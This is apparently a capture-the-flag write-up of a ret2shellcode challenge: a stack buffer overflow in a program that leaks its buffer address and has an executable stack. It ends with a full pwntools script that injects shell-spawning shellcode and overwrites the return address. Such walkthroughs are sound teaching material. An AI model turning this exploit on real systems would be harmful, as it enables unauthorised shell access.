## Whispered Secrets - ret2shellcode
### The Vulnerable Code

The challenge provides a single C file containing a `setup()` function that disables buffering on all three standard streams, and a `vuln()` function that is the real target. Inside `vuln()`, a 128-byte buffer is declared on the stack, its runtime address is immediately printed via `printf("secret: %p\n", (void *)buf)`, and then `read()` is called with a limit of 1024 bytes, which is far larger than the buffer can hold. This combination of a printed address and an unbounded read is the entire attack surface.

The reason the address leak is essential is that ASLR randomizes the stack on every execution, so without knowing where the buffer lands at runtime you would have no reliable target to jump to.

### Attack Chain

The exploitation strategy here is different from a classic ret2libc or ROP approach, because NX is not enforced and the stack is executable. The full chain is: read the leaked buffer address, inject shellcode into the buffer, overwrite RIP with that same address, and let the CPU jump directly into the shellcode when `vuln()` returns.

### Phase 1 - Reconnaissance

Running `checksec` on the binary reveals the following protection profile:

|Protection|Status|Meaning|
|---|---|---|
|NX|Unknown / Executable Stack|The stack is executable, so shellcode can run directly|
|PIE|Disabled|Addresses are fixed, though this is less critical since we have the leak|
|Stack Canary|Not found|We can overflow straight to RIP without any leak or bypass|
|RWX|Present|Memory regions exist that are simultaneously readable, writable, and executable|

The critical observation is that NX is effectively disabled here, which opens the door to injecting raw machine code directly into the buffer and redirecting execution into it.

### Phase 2 - Identifying the Control Point

The control point is the saved return address on the stack, commonly referred to as the saved RIP. When `vuln()` returns, the CPU fetches that value and jumps to it, so overwriting it with the address of the buffer redirects execution into our shellcode. The binary conveniently hands us the buffer address at runtime via the `printf` call, with the leak appearing on the line that starts with `secret:`. An example leaked value would be `0x7fffffffe240`, though the actual value changes on every run because of ASLR.

### Phase 3 - Computing the Overwrite Offset

To find the exact number of bytes needed to reach RIP, a cyclic pattern is generated with pwntools, passed to the binary inside GDB, and the offset is recovered from the crash. The result is 136 bytes, which accounts for the 128-byte buffer itself followed by the 8-byte saved RBP slot, so bytes 0 through 135 are padding and byte 136 is the first byte of the overwritten return address.

### Phase 4 - Building the Exploit

The payload is structured so that the shellcode sits at the very beginning of the buffer, a padding sequence of `A` bytes fills the remaining space up to the return address, and finally the leaked buffer address is written as the new RIP value. Because the shellcode starts at offset 0 within the buffer, jumping to the buffer address jumps directly into the first instruction of the shellcode.
```python
#!/usr/bin/env python3
from pwn import *

exe = ELF("./whispered_secrets")
context.binary = exe
context.arch   = 'amd64'
context.os     = 'linux'

HOSTNAME = 'HOSTNAME_PLACEHOLDER'
PORT     = 0  # PORT_PLACEHOLDER

# ── offsets ───────────────────────────────────────────────────────────────────
OFFSET_TO_RIP = 136

def conn():
    if args.LOCAL:
        return process(exe.path)
    return remote(HOSTNAME, PORT)

def main():
    r = conn()

    # ── leak phase ────────────────────────────────────────────────────────────
    leak_line = r.recvline_contains(b"secret:")
    buf_addr  = int(leak_line.split(b"secret: ")[1].strip(), 16)
    log.info(f"buf = {buf_addr:#x}")

    # ── exploit phase ─────────────────────────────────────────────────────────
    shellcode = asm(shellcraft.sh())

    payload = flat(
        shellcode,                               # machine code at start of buf
        b'A' * (OFFSET_TO_RIP - len(shellcode)), # padding to reach RIP
        p64(buf_addr),                           # overwrite RIP → jump to shellcode
    )

    r.sendafter(b"secret:\n", payload)
    r.interactive()

if __name__ == "__main__":
    main()
```